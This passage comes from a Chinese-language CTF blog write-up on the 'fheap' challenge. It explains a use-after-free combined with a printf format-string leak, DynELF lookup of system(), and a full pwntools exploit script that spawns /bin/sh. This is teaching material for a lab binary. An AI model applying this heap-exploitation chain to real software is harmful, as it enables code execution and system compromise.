class="string">&apos;\x00&apos;</span>))</span><br><span class="line">process_base = <span class="keyword">data</span> - <span class="number">0xd2d</span></span><br><span class="line"><span class="keyword">delete</span>(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p>&#x83B7;&#x53D6;&#x4E86;&#x7A0B;&#x5E8F;&#x7684;&#x57FA;&#x5740;&#xFF0C;&#x63A5;&#x4E0B;&#x6765;&#x5C31;&#x662F;&#x83B7;&#x53D6;system&#x51FD;&#x6570;&#x7684;&#x5730;&#x5740;&#xFF0C;&#x56E0;&#x4E3A;&#x7A0B;&#x5E8F;&#x4E3A;&#x8C03;&#x7528;&#x8FC7;system&#x51FD;&#x6570;&#xFF0C;&#x6240;&#x4EE5;&#x4F7F;&#x7528;pwntools&#x7684;DynELF&#x51FD;&#x6570;&#x5BF9;&#x7A0B;&#x5E8F;&#x4F7F;&#x7528;&#x7684;libc&#x5E93;&#x8FDB;&#x884C;&#x641C;&#x7D22;&#xFF0C;&#x83B7;&#x53D6;system&#x51FD;&#x6570;&#x7684;&#x5730;&#x5740;&#x3002;</p>
<h2 id="&#x5229;&#x7528;UAF&#x548C;&#x683C;&#x5F0F;&#x5316;&#x5B57;&#x7B26;&#x4E32;&#x6F0F;&#x6D1E;&#x83B7;&#x53D6;system&#x5730;&#x5740;"><a href="#&#x5229;&#x7528;UAF&#x548C;&#x683C;&#x5F0F;&#x5316;&#x5B57;&#x7B26;&#x4E32;&#x6F0F;&#x6D1E;&#x83B7;&#x53D6;system&#x5730;&#x5740;" class="headerlink" title="&#x5229;&#x7528;UAF&#x548C;&#x683C;&#x5F0F;&#x5316;&#x5B57;&#x7B26;&#x4E32;&#x6F0F;&#x6D1E;&#x83B7;&#x53D6;system&#x5730;&#x5740;"></a>&#x5229;&#x7528;UAF&#x548C;&#x683C;&#x5F0F;&#x5316;&#x5B57;&#x7B26;&#x4E32;&#x6F0F;&#x6D1E;&#x83B7;&#x53D6;system&#x5730;&#x5740;</h2><p>DynELF&#x662F;pwntools&#x4E2D;&#x4E13;&#x95E8;&#x7528;&#x6765;&#x5E94;&#x5BF9;&#x65E0;libc&#x60C5;&#x51B5;&#x7684;&#x6F0F;&#x6D1E;&#x5229;&#x7528;&#x6A21;&#x5757;&#xFF0C;&#x9700;&#x8981;&#x4E00;&#x4E2A;&#x7A0B;&#x5E8F;&#x5B58;&#x5728;&#x53EF;&#x4EE5;&#x53CD;&#x590D;&#x89E6;&#x53D1;&#x4FE1;&#x606F;&#x6CC4;&#x9732;&#x7684;&#x6F0F;&#x6D1E;&#xFF0C;&#x4ECE;&#x800C;&#x53EF;&#x4EE5;&#x4E0D;&#x65AD;&#x6CC4;&#x9732;libc&#x5730;&#x5740;&#x7A7A;&#x95F4;&#x5185;&#x7684;&#x4FE1;&#x606F;&#x3002;<br>&#x5C06;<code>void (*free)(struct String *ptr);</code>&#x8986;&#x76D6;&#x4E3A;printf&#xFF0C;&#x8FDB;&#x800C;&#x6784;&#x9020;&#x5229;&#x7528;&#x683C;&#x5F0F;&#x5316;&#x5B57;&#x7B26;&#x4E32;&#x6F0F;&#x6D1E;&#x6CC4;&#x9732;&#x5185;&#x5B58;&#x3002;leak&#x51FD;&#x6570;&#x5982;&#x4E0B;<br><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">printf_plt = process_base + <span class="number">0x9d0</span></span><br><span class="line">def leak(addr):</span><br><span class="line">        <span class="keyword">data</span> = <span class="string">&apos;%9$sAA&apos;</span> + <span class="string">&apos;#&apos;</span>*(<span class="number">0x18</span> - len(<span class="string">&apos;%9$sAA&apos;</span>)) + p64(printf_plt)</span><br><span class="line">        create(<span class="number">0x20</span>, <span class="keyword">data</span>)</span><br><span class="line">        p.recvuntil(<span class="string">&quot;quit&quot;</span>)</span><br><span class="line">        p.sendline(<span class="string">&quot;delete string&quot;</span>)</span><br><span class="line">        p.recvuntil(<span class="string">&apos;id:&apos;</span>)</span><br><span class="line">        p.sendline(str(<span class="number">1</span>))</span><br><span class="line">        p.recvuntil(<span class="string">&apos;sure?:&apos;</span>)</span><br><span class="line">        p.sendline(<span class="string">&apos;yes12345&apos;</span> + p64(addr))</span><br><span class="line">        <span class="keyword">data</span> = p.recvuntil(<span class="string">&apos;AA&apos;</span>)[:<span class="number">-2</span>]</span><br><span class="line">        <span class="keyword">data</span> += <span class="string">&quot;\00&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">data</span></span><br></pre></td></tr></table></figure></p>
<p>&#x53D1;&#x73B0;printf&#x51FD;&#x6570;&#x8C03;&#x7528;&#x65F6;&#x51FA;&#x73B0;segmentation&#x6BB5;&#x9519;&#x8BEF;&#xFF0C;&#x540E;&#x6765;&#x5BF9;&#x6BD4;&#x53D1;&#x73B0;&#x6B63;&#x5E38;&#x7684;printf&#x51FD;&#x6570;&#x6D41;&#x7A0B;&#x5728;<code>&lt;__printf+34&gt;</code>&#x5F53;ZF=1&#x65F6;je&#x4F1A;&#x8DF3;&#x8F6C;&#xFF0C;&#x800C;<code>&lt;__printf+7&gt;:test   al,al</code>&#x5F53;al and al&#x7B49;&#x4E8E;0&#x65F6;&#x4F1A;&#x5C06;ZF&#x6807;&#x5FD7;&#x5BC4;&#x5B58;&#x5668;&#x7F6E;1&#xFF0C;&#x6545;al and al = 1&#x65F6;&#xFF0C;je&#x4F1A;&#x8DF3;&#x8F6C;&#x3002;&#x6BB5;&#x9519;&#x8BEF;&#x65F6;&#xFF0C;printf&#x51FD;&#x6570;&#x6CA1;&#x6709;&#x53D1;&#x751F;&#x8DF3;&#x8F6C;&#xFF0C;&#x800C;&#x662F;&#x6267;&#x884C;&#x5230;<code>&lt;__printf+36&gt;</code>&#xFF0C;&#x53D1;&#x751F;&#x9519;&#x8BEF;&#x3002;<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x7ff6ab807800</span> &lt;__printf&gt;:	<span class="keyword">sub</span>    <span class="built_in">rsp</span>,<span class="number">0xd8</span></span><br><span class="line">   <span class="number">0x7ff6ab807807</span> &lt;__printf+<span class="number">7</span>&gt;:	<span class="keyword">test</span>   <span class="built_in">al</span>,<span class="built_in">al</span></span><br><span class="line">   <span class="number">0x7ff6ab807809</span> &lt;__printf+<span class="number">9</span>&gt;:	<span class="keyword">mov</span>    <span class="built_in">QWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rsp</span>+<span class="number">0x28</span>],<span class="built_in">rsi</span></span><br><span class="line">   <span class="number">0x7ff6ab80780e</span> &lt;__printf+<span class="number">14</span>&gt;:	<span class="keyword">mov</span>    <span class="built_in">QWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rsp</span>+<span class="number">0x30</span>],<span class="built_in">rdx</span></span><br><span class="line">   <span class="number">0x7ff6ab807813</span> &lt;__printf+<span class="number">19</span>&gt;:	<span class="keyword">mov</span>    <span class="built_in">QWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rsp</span>+<span class="number">0x38</span>],<span class="built_in">rcx</span></span><br><span class="line">   <span class="number">0x7ff6ab807818</span> &lt;__printf+<span class="number">24</span>&gt;:	<span class="keyword">mov</span>    <span class="built_in">QWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rsp</span>+<span class="number">0x40</span>],<span class="built_in">r8</span></span><br><span class="line">   <span class="number">0x7ff6ab80781d</span> &lt;__printf+<span class="number">29</span>&gt;:	<span class="keyword">mov</span>    <span class="built_in">QWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rsp</span>+<span class="number">0x48</span>],<span class="built_in">r9</span></span><br><span class="line">   <span class="number">0x7ff6ab807822</span> &lt;__printf+<span class="number">34</span>&gt;:	<span class="keyword">je</span>     <span class="number">0x7ff6ab80785b</span> &lt;__printf+<span class="number">91</span>&gt;</span><br><span class="line">   <span class="number">0x7ff6ab807824</span> &lt;__printf+<span class="number">36</span>&gt;:	<span class="keyword">movaps</span> XMMWORD <span class="built_in">PTR</span> [<span class="built_in">rsp</span>+<span class="number">0x50</span>],<span class="built_in">xmm0</span></span><br><span class="line">   <span class="number">0x7ff6ab807829</span> &lt;__printf+<span class="number">41</span>&gt;:	<span class="keyword">movaps</span> XMMWORD <span class="built_in">PTR</span> [<span class="built_in">rsp</span>+<span class="number">0x60</span>],<span class="built_in">xmm1</span></span><br><span class="line">   <span class="number">0x7ff6ab80782e</span> &lt;__printf+<span class="number">46</span>&gt;:	<span class="keyword">movaps</span> XMMWORD <span class="built_in">PTR</span> [<span class="built_in">rsp</span>+<span class="number">0x70</span>],<span class="built_in">xmm2</span></span><br><span class="line">   <span class="number">0x7ff6ab807833</span> &lt;__printf+<span class="number">51</span>&gt;:	<span class="keyword">movaps</span> XMMWORD <span class="built_in">PTR</span> [<span class="built_in">rsp</span>+<span class="number">0x80</span>],<span class="built_in">xmm3</span></span><br><span class="line">   <span class="number">0x7ff6ab80783b</span> &lt;__printf+<span class="number">59</span>&gt;:	<span class="keyword">movaps</span> XMMWORD <span class="built_in">PTR</span> [<span class="built_in">rsp</span>+<span class="number">0x90</span>],<span class="built_in">xmm4</span></span><br><span class="line">   <span class="number">0x7ff6ab807843</span> &lt;__printf+<span class="number">67</span>&gt;:	<span class="keyword">movaps</span> XMMWORD <span class="built_in">PTR</span> [<span class="built_in">rsp</span>+<span class="number">0xa0</span>],<span class="built_in">xmm5</span></span><br><span class="line">   <span class="number">0x7ff6ab80784b</span> &lt;__printf+<span class="number">75</span>&gt;:	<span class="keyword">movaps</span> XMMWORD <span class="built_in">PTR</span> [<span class="built_in">rsp</span>+<span class="number">0xb0</span>],<span class="built_in">xmm6</span></span><br><span class="line">   <span class="number">0x7ff6ab807853</span> &lt;__printf+<span class="number">83</span>&gt;:	<span class="keyword">movaps</span> XMMWORD <span class="built_in">PTR</span> [<span class="built_in">rsp</span>+<span class="number">0xc0</span>],<span class="built_in">xmm7</span></span><br><span class="line">   <span class="number">0x7ff6ab80785b</span> &lt;__printf+<span class="number">91</span>&gt;:	<span class="keyword">lea</span>    <span class="built_in">rax</span>,[<span class="built_in">rsp</span>+<span class="number">0xe0</span>]</span><br><span class="line">   ......</span><br></pre></td></tr></table></figure></p>
<p>&#x6240;&#x4EE5;&#x8BB2;<code>void (*free)(struct String *ptr);</code>&#x6307;&#x5411;0xF51&#xFF0C;&#x4F1A;&#x5C06;al&#x7F6E;&#x96F6;<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:0000000000000F51</span>                 <span class="selector-tag">mov</span>     <span class="selector-tag">eax</span>, 0</span><br><span class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:0000000000000F56</span>                 <span class="selector-tag">call</span>    _<span class="selector-tag">printf</span></span><br><span class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:0000000000000F5B</span>                 <span class="selector-tag">mov</span>     <span class="selector-tag">rdx</span>, <span class="selector-attr">[rbp+nbytes]</span> ; <span class="selector-tag">nbytes</span></span><br></pre></td></tr></table></figure></p>
<p>&#x6D4B;&#x8BD5;&#x540E;&#x53D1;&#x73B0;&#xFF0C;printf&#x53EF;&#x4EE5;&#x6B63;&#x5E38;&#x6253;&#x5370;&#x51FA;&#x5730;&#x5740;&#xFF0C;&#x4F46;&#x662F;&#x53EA;&#x80FD;&#x6267;&#x884C;&#x4E00;&#x6B21;&#xFF0C;&#x56E0;&#x4E3A;DynELF&#x8981;&#x6C42;leak&#x51FD;&#x6570;&#x80FD;&#x591F;&#x91CD;&#x590D;&#x6267;&#x884C;&#xFF0C;&#x5206;&#x6790;&#x53D1;&#x73B0;&#xFF0C;&#x539F;&#x6765;&#x7684;leak&#x51FD;&#x6570;&#x4E2D;&#x51FD;&#x6570;&#x6307;&#x9488;&#x6307;&#x5411;print@plt&#xFF0C;&#x8C03;&#x7528;&#x51FD;&#x6570;&#xFF0C;&#x51FD;&#x6570;&#x7684;&#x8FD4;&#x56DE;&#x503C;&#x4E0D;&#x53D8;&#xFF0C;&#x6267;&#x884C;<code>delete(1)</code>&#x540E;&#xFF0C;&#x80FD;&#x6839;&#x636E;&#x8FD4;&#x56DE;&#x503C;&#xFF0C;&#x8FD4;&#x56DE;&#x5230;&#x83DC;&#x5355;&#x754C;&#x9762;&#xFF0C;&#x518D;&#x6B21;&#x6267;&#x884C;<code>delete(0)</code>&#xFF0C;&#x800C;&#x5C06;&#x51FD;&#x6570;&#x6307;&#x9488;&#x6307;&#x5411;0xF51&#x65F6;&#xFF0C;&#x8C03;&#x7528;&#x4E86;&#x4E00;&#x4E2A;call&#xFF0C;&#x51FD;&#x6570;&#x7684;&#x8FD4;&#x56DE;&#x5230;0xF5B&#xFF0C;&#x7A0B;&#x5E8F;&#x8FD4;&#x56DE;&#x4E0D;&#x5230;&#x539F;&#x6765;&#x7684;&#x83DC;&#x5355;&#x754C;&#x9762;&#x3002;<br>&#x6700;&#x540E;&#x901A;&#x8FC7;&#x5728;leak&#x51FD;&#x6570;&#x524D;&#xFF0C;&#x518D;&#x6B21;<code>create(0x20,data)</code>&#xFF0C;&#x91CA;&#x653E;&#x5806;&#x5FEB;&#xFF0C;&#x91CD;&#x65B0;&#x5E03;&#x5C40;&#x5185;&#x5B58;&#x7A7A;&#x95F4;&#xFF0C;&#x4E0D;&#x9700;&#x8981;&#x5C06;&#x51FD;&#x6570;&#x6307;&#x9488;&#x6307;&#x5411;0xF51&#x4E5F;&#x53EF;&#x4EE5;&#x6B63;&#x5E38;&#x6267;&#x884C;printf&#x51FD;&#x6570;&#x3002;<br>&#x6CC4;&#x9732;&#x51FA;system&#x51FD;&#x6570;&#x5730;&#x5740;&#x540E;&#xFF0C;&#x518D;&#x6B21;&#x5229;&#x7528;&#x51FD;&#x6570;&#x6307;&#x9488;&#xFF0C;&#x6267;&#x884C;<code>/bin/sh;</code>&#x83B7;&#x53D6;shell&#x3002;</p>
<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="built_in">from</span> pwn import *</span><br><span class="line"></span><br><span class="line">p = <span class="built_in">process</span>(<span class="string">&apos;./fheap&apos;</span>)</span><br><span class="line">DEBUG = <span class="number">0</span></span><br><span class="line">VERBOSE = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">	gdb.attach(p)</span><br><span class="line"><span class="keyword">if</span> VERBOSE:</span><br><span class="line">	context(log_level = <span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line">def <span class="built_in">create</span>(size,content):</span><br><span class="line">	p.recvuntil(<span class="string">&quot;quit&quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">&quot;create string&quot;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;size:&quot;</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(<span class="string">&apos;str:&apos;</span>)</span><br><span class="line">	p.sendline(content.ljust(size,<span class="string">&apos;\x00&apos;</span>))</span><br><span class="line">	p.recvuntil(<span class="string">&apos;n&apos;</span>)</span><br><span class="line"></span><br><span class="line">def <span class="built_in">delete</span>(idx):</span><br><span class="line">	p.recvuntil(<span class="string">&quot;quit&quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">&quot;delete string&quot;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&apos;id:&apos;</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line">	p.recvuntil(<span class="string">&apos;sure?:&apos;</span>)</span><br><span class="line">	p.<span class="built_in">send</span>(<span class="string">&apos;yes &apos;</span>+<span class="string">&apos;\n&apos;</span>)</span><br><span class="line"></span><br><span class="line">printf_plt = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">def leak(addr):</span><br><span class="line">	<span class="built_in">delete</span>(<span class="number">0</span>)</span><br><span class="line">	data = <span class="string">&apos;%9$sAA&apos;</span> + <span class="string">&apos;#&apos;</span>*(<span class="number">0x18</span> - <span class="built_in">len</span>(<span class="string">&apos;%9$sAA&apos;</span>)) + p64(printf_plt)</span><br><span class="line">  <span class="built_in">create</span>(<span class="number">0x20</span>, data)</span><br><span class="line">  p.recvuntil(<span class="string">&quot;quit&quot;</span>)</span><br><span class="line">  p.sendline(<span class="string">&quot;delete string&quot;</span>)</span><br><span class="line">  p.recvuntil(<span class="string">&apos;id:&apos;</span>)</span><br><span class="line">  p.sendline(str(<span class="number">1</span>))</span><br><span class="line">  p.recvuntil(<span class="string">&apos;sure?:&apos;</span>)</span><br><span class="line">  p.sendline(<span class="string">&apos;yes12345&apos;</span> + p64(addr))</span><br><span class="line">  data = p.recvuntil(<span class="string">&apos;AA&apos;</span>)[:<span class="number">-2</span>]</span><br><span class="line">	data += <span class="string">&quot;\00&quot;</span></span><br><span class="line">	<span class="literal">return</span> data</span><br><span class="line"></span><br><span class="line">def pwn():</span><br><span class="line">	<span class="built_in">global</span> printf_plt</span><br><span class="line">	<span class="built_in">create</span>(<span class="number">4</span>,<span class="string">&apos;bb&apos;</span>)</span><br><span class="line">	<span class="built_in">create</span>(<span class="number">4</span>,<span class="string">&apos;cc&apos;</span>)</span><br><span class="line">	<span class="built_in">delete</span>(<span class="number">1</span>)</span><br><span class="line">	<span class="built_in">delete</span>(<span class="number">0</span>)</span><br><span class="line">	<span class="comment">#get the base address of process due to the process has opened ASLR(PIE).</span></span><br><span class="line">	data=<span class="string">&apos;a&apos;</span> * <span class="number">0x10</span> + <span class="string">&apos;b&apos;</span> * <span class="number">0x8</span> + <span class="string">&apos;\x2d&apos;</span></span><br><span class="line">	<span class="built_in">create</span>(<span class="number">0x20</span>, data)</span><br><span class="line">	<span class="built_in">delete</span>(<span class="number">1</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&apos;b&apos;</span> * <span class="number">0x8</span>)</span><br><span class="line">	data = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&apos;\x00&apos;</span>))</span><br><span class="line">	process_base = data - <span class="number">0xd2d</span></span><br><span class="line">	<span class="built_in">log</span>.success(<span class="string">&apos;process_base:&apos;</span>+hex(process_base))</span><br><span class="line">	printf_plt = process_base + <span class="number">0x9d0</span></span><br><span class="line">	<span class="built_in">log</span>.success(<span class="string">&apos;printf_plt:&apos;</span>+hex(printf_plt))</span><br><span class="line">	<span class="built_in">delete</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">	data = <span class="string">&apos;a&apos;</span> * <span class="number">0x10</span> + <span class="string">&apos;b&apos;</span> * <span class="number">0x8</span> + <span class="string">&apos;\x2d&apos;</span></span><br><span class="line">	<span class="built_in">create</span>(<span class="number">0x20</span>,data)</span><br><span class="line">	<span class="built_in">delete</span>(<span class="number">1</span>)</span><br><span class="line">	d = DynELF(leak,process_base,elf = ELF(<span class="string">&apos;./fheap&apos;</span>))</span><br><span class="line">	system_addr = d.lookup(<span class="string">&apos;system&apos;</span>,<span class="string">&apos;libc&apos;</span>)</span><br><span class="line">	<span class="built_in">delete</span>(<span class="number">0</span>)</span><br><span class="line">	<span class="built_in">log</span>.success(<span class="string">&apos;system_addr:&apos;</span>+hex(system_addr))</span><br><span class="line"></span><br><span class="line">	data = <span class="string">&apos;/bin/sh;&apos;</span> + <span class="string">&apos;#&apos;</span>*(<span class="number">0x18</span> - <span class="built_in">len</span>(<span class="string">&apos;/bin/sh;&apos;</span>)) + p64(system_addr)</span><br><span class="line">	<span class="built_in">create</span>(<span class="number">0x20</span>,data)</span><br><span class="line">	<span class="built_in">delete</span>(<span class="number">1</span>)</span><br><span class="line">	p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&apos;__main__&apos;</span>:</span><br><span class="line">	pwn()</span><br></pre></td></tr></table></figure>
</div><hr></div><nav id="pagination"><div class="pagination"><a class="extend prev" rel="prev" href="/page/3/"><i class="fa fa-chevron-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/5/"><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer class="footer-bg" style="background-image: url(https://raw.githubusercontent.com/Po1lux/Po1lux.github.io/hexo/source/images/IMG_3035.JPG)"><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2020 By Po1lux</div><div class="framework-info"><span>驱动 - </span><a href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span><span></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.6.1"></script><script src="/js/fancybox.js?version=1.6.1"></script><script src="/js/sidebar.js?version=1.6.1"></script><script src="/js/copy.js?version=1.6.1"></script><script src="/js/fireworks.js?version=1.6.1"></script><script src="/js/transition.js?version=1.6.1"></script><script src="/js/scroll.js?version=1.6.1"></script><script src="/js/head.js?version=1.6.1"></script><script>if(/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
}</script></body></html>